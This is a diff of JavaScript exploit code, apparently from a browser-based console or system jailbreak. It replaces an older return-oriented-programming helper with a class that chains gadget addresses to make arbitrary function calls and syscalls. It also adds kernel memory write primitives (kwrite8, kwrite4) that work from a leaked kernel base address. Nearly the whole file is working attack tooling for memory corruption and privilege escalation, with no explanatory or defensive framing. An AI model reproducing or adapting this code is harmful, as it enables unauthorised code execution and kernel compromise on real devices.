@@ -1,131 +1,165 @@
-window.memory = function (address) {
-  this.basePtr = address;
-  this.dataPtr = 0;
+const stack_sz = 0x40000;
+const reserve_upper_stack = 0x8000;
+const stack_reserved_idx = reserve_upper_stack / 4;
 
-  this.allocate = function (size) {
-    if (this.dataPtr > 0x10000 || this.dataPtr + size > 0x10000) {
-      return -1;
-    }
 
-    var memAddr = this.basePtr.add32(this.dataPtr);
-
-    this.dataPtr += size;
-
-    return memAddr;
-  };
-
-  this.clear = function () {
-    for (var i = 0; i < 0x10000; i += 8) {
-      p.write8(this.basePtr.add32(i), 0);
-    }
-  };
-
-  this.clear();
-
-  return this;
-};
-
-window.kropchain = function (addr) {
-  this.stackBase = addr;
-  this.count = 0;
-
-  this.push = function (val) {
-    p.write8(this.stackBase.add32(this.count * 8), val);
-    this.count++;
-  };
-
-  this.write64 = function (address, value) {
-    this.push(gadgets['pop rdi']);
-    this.push(address);
-    this.push(gadgets['pop rax']);
-    this.push(value);
-    this.push(gadgets['mov [rdi], rax']);
-  };
-
-  return this;
-};
-
+// Class for quickly creating and managing a ROP chain
 window.rop = function () {
-  this.stack = new Uint32Array(0x4000);
-  this.stackBase = p.read8(p.leakval(this.stack).add32(leakval_slide));
-  this.count = 0;
+    this.stackback = p.malloc32(stack_sz / 4 + 0x8);
+    this.stack = this.stackback.add32(reserve_upper_stack);
+    this.stack_array = this.stackback.backing;
+    this.retval = this.stackback.add32(stack_sz);
+    this.count = 1;
+    this.branches_count = 0;
+    this.branches_rsps = p.malloc(0x200);
 
-  this.clear = function () {
-    this.count = 0;
-    this.runtime = undefined;
+    this.clear = function () {
+        this.count = 1;
+        this.branches_count = 0;
 
-    for (var i = 0; i < 0xFF0 / 2; i++) {
-      p.write8(this.stackBase.add32(i * 8), 0);
-    }
-  };
+        for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
+            this.stack_array[i + stack_reserved_idx] = 0;
+        }
+    };
 
-  this.pushSymbolic = function () {
-    this.count++;
-    return this.count - 1;
-  };
-
-  this.finalizeSymbolic = function (idx, val) {
-    p.write8(this.stackBase.add32(idx * 8), val);
-  };
-
-  this.push = function (val) {
-    this.finalizeSymbolic(this.pushSymbolic(), val);
-  };
-
-  this.push_write8 = function (where, what) {
-    this.push(gadgets['pop rdi']);
-    this.push(where);
-    this.push(gadgets['pop rsi']);
-    this.push(what);
-    this.push(gadgets['mov [rdi], rsi']);
-  };
-
-  this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
-    if (rdi !== undefined) {
-      this.push(gadgets['pop rdi']);
-      this.push(rdi);
+    this.pushSymbolic = function () {
+        this.count++;
+        return this.count - 1;
     }
 
-    if (rsi !== undefined) {
-      this.push(gadgets['pop rsi']);
-      this.push(rsi);
+    this.finalizeSymbolic = function (idx, val) {
+        if (val instanceof int64) {
+            this.stack_array[stack_reserved_idx + idx * 2] = val.low;
+            this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
+        } else {
+            this.stack_array[stack_reserved_idx + idx * 2] = val;
+            this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
+        }
     }
 
-    if (rdx !== undefined) {
-      this.push(gadgets['pop rdx']);
-      this.push(rdx);
+    this.push = function (val) {
+        this.finalizeSymbolic(this.pushSymbolic(), val);
     }
 
-    if (rcx !== undefined) {
-      this.push(gadgets['pop rcx']);
-      this.push(rcx);
+    this.push_write8 = function (where, what) {
+        this.push(gadgets["pop rdi"]);
+        this.push(where);
+        this.push(gadgets["pop rsi"]);
+        this.push(what);
+        this.push(gadgets["mov [rdi], rsi"]);
     }
 
-    if (r8 !== undefined) {
-      this.push(gadgets['pop r8']);
-      this.push(r8);
+    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
+        if (rdi != undefined) {
+            this.push(gadgets["pop rdi"]);
+            this.push(rdi);
+        }
+
+        if (rsi != undefined) {
+            this.push(gadgets["pop rsi"]);
+            this.push(rsi);
+        }
+
+        if (rdx != undefined) {
+            this.push(gadgets["pop rdx"]);
+            this.push(rdx);
+        }
+
+        if (rcx != undefined) {
+            this.push(gadgets["pop rcx"]);
+            this.push(rcx);
+        }
+
+        if (r8 != undefined) {
+            this.push(gadgets["pop r8"]);
+            this.push(r8);
+        }
+
+        if (r9 != undefined) {
+            this.push(gadgets["pop r9"]);
+            this.push(r9);
+        }
+
+        this.push(rip);
+        return this;
     }
 
-    if (r9 !== undefined) {
-      this.push(gadgets['pop r9']);
-      this.push(r9);
+    this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
+        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
+        this.write_result(this.retval);
+        this.run();
+        return p.read8(this.retval);
     }
 
-    this.push(rip);
+    this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
+        return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+    }
+
+    //get rsp of the next push
+    this.get_rsp = function () {
+        return this.stack.add32(this.count * 8);
+    }
+    this.write_result = function (where) {
+        this.push(gadgets["pop rdi"]);
+        this.push(where);
+        this.push(gadgets["mov [rdi], rax"]);
+    }
+    this.write_result4 = function (where) {
+        this.push(gadgets["pop rdi"]);
+        this.push(where);
+        this.push(gadgets["mov [rdi], eax"]);
+    }
+
+    this.jmp_rsp = function (rsp) {
+        this.push(window.gadgets["pop rsp"]);
+        this.push(rsp);
+    }
+
+    this.run = function () {
+        p.launch_chain(this);
+        this.clear();
+    }
+
+    this.KERNEL_BASE_PTR_VAR;
+    this.set_kernel_var = function (arg) {
+        this.KERNEL_BASE_PTR_VAR = arg;
+    }
+
+    this.rax_kernel = function (offset) {
+        this.push(gadgets["pop rax"]);
+        this.push(this.KERNEL_BASE_PTR_VAR)
+        this.push(gadgets["mov rax, [rax]"]);
+        this.push(gadgets["pop rsi"]);
+        this.push(offset)
+        this.push(gadgets["add rax, rsi"]);
+    }
+
+    this.write_kernel_addr_to_chain_later = function (offset) {
+        this.push(gadgets["pop rdi"]);
+        var idx = this.pushSymbolic();
+        this.rax_kernel(offset);
+        this.push(gadgets["mov [rdi], rax"]);
+        return idx;
+    }
+
+    this.kwrite8 = function (offset, qword) {
+        this.rax_kernel(offset);
+        this.push(gadgets["pop rsi"]);
+        this.push(qword);
+        this.push(gadgets["mov [rax], rsi"]);
+    }
+    this.kwrite4 = function (offset, dword) {
+        this.rax_kernel(offset);
+        this.push(gadgets["pop rdx"]);
+        this.push(dword);
+        this.push(gadgets["mov [rax], edx"]);
+    }
+
+    this.kwrite8_kaddr = function (offset1, offset2) {
+        this.rax_kernel(offset2);
+        this.push(gadgets["mov rdx, rax"]);
+        this.rax_kernel(offset1);
+        this.push(gadgets["mov [rax], rdx"]);
+    }
     return this;
-  };
-
-  this.saveReturnValue = function (where) {
-    this.push(gadgets['pop rdi']);
-    this.push(where);
-    this.push(gadgets['mov [rdi], rax']);
-  };
-
-  this.run = function () {
-    var retv = p.loadchain(this, this.notimes);
-    this.clear();
-    return retv;
-  };
-
-  return this;
 };
